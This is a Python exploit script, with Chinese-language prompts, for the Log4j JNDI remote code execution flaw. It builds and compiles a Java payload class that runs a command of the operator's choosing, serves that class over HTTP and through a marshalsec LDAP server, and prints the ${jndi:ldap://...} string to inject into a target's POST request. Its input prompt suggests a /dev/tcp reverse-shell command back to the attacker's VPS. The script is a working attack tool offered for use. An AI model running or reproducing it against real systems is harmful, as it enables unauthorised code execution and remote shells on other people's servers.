#!/usr/bin/python3
#-*- coding:utf-8 -*-
# author : 平平无奇的韩LM
# from   : https://www.reef.run/

import base64
import requests
import random
import re
import json
import sys
import os
import time

def title():
    print('+------------------------------------------')
    print('+  \033[36m使用格式:  python3 log4j_exp.py                                            \033[0m')
    print('+  \033[36m小菜:  平平无奇的韩LM                                          \033[0m')
    print('+  \033[36mUrl         >>> http://xxx.xxx.xxx.xxx                             \033[0m')
    print('+------------------------------------------')

def createHttpEXP(cmd):
    if not os.path.exists("Exp.java"):
        file = open('./Exp.java','w')
        exp='''public class Exp {{
    public Exp() {{}}
    static {{
        try {{
            String[] cmds = {{{}}};
            java.lang.Runtime.getRuntime().exec(cmds).waitFor();
        }}catch (Exception e){{
            e.printStackTrace();
        }}
    }}
    public static void main(String[] args) {{
        Exp e = new Exp();
    }}

    }}'''.format(cmd)
    
        file.write(exp)
        print("\033[36m[o] 生成本地 Exp.java \033[0m")
    
    
    time.sleep(2)
    os.system("javac Exp.java")
    time.sleep(1)
    if os.path.exists("Exp.class"):
        print("\033[36m[o] 生成本地 Exp.class \033[0m")

    
    
    

def check_class(cmd):
    if not os.path.exists("Exp.class"):
        print("\033[31m[x] Exp.class未生成 重新生成中\033[0m")
        createHttpEXP(cmd)
        return check_class(cmd)
        

def up_exp_service_9000():
    os.system("nohup python -m SimpleHTTPServer 9000 &")
    print("\033[36m[o] 开启本地9000端口 Serving HTTP on 0.0.0.0 port 9000 \033[0m")


def up_exp_service_9999(vps):

    os.system('''nohup java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer "http://{}:9000/#Exp" 9999 &'''.format(vps))
    print("\033[36m[o] 开启本地9999端口 等待对方调用我本地exp Listening on 0.0.0.0:9999 \033[0m")
    print("\033[33m[o] 请在post数据包中插入payload:  c=${{jndi:ldap://{}:9999/Exp}}  提交后可以触发该rce\033[0m".format(vps))
    print("\033[33m[o] 要执行的命令为:  {}\033[0m".format(cmd))


if __name__ == '__main__':
    title()
    vps=str(input('''\033[35mPlease input Attack vps\nvps(: 类似：127.0.0.1  >>> \033[0m'''))
    cmd=str(input('''\033[35mPlease input Attack cmd\ncmd(: 类似："/bin/bash","-c","exec 5<>/dev/tcp/vps/8787;cat <&5 | while read line; do $line 2>&5 >&5; done" \n 类似： "ping","-c 4","dnslog.ceye.io" >>> \033[0m'''))
    check_class(cmd)
    up_exp_service_9000()

    up_exp_service_9999(vps)
